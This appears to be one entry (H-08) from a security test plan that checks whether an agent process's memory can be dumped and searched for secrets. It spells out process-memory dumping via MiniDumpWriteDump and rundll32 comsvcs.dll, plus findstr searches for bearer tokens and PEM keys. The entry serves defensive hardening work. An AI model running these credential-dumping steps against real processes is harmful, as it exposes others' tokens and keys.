# H-08

Dump and search agent memory for secrets.

1. Attempt `OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, agentPid)`. If denied, record `hold` (handle protection works).
2. If a handle is obtained, create a minidump: `MiniDumpWriteDump(hAgent, agentPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)` or use `comsvcs.dll`: `rundll32 comsvcs.dll, MiniDump <pid> C:\TEMP\agent.dmp full`.
3. Search the dump for:
   - Bearer tokens: `findstr /i "bearer eyJ" agent.dmp`
   - PEM keys: `findstr "-----BEGIN" agent.dmp`
   - Embedded URLs with credentials
   - SQLite database paths or encryption keys
4. If secrets are found, record `miss` describing the type (not the value).
5. If the dump succeeds but contains no recoverable secrets (encrypted at rest), record `hold`.
6. Delete the dump file.
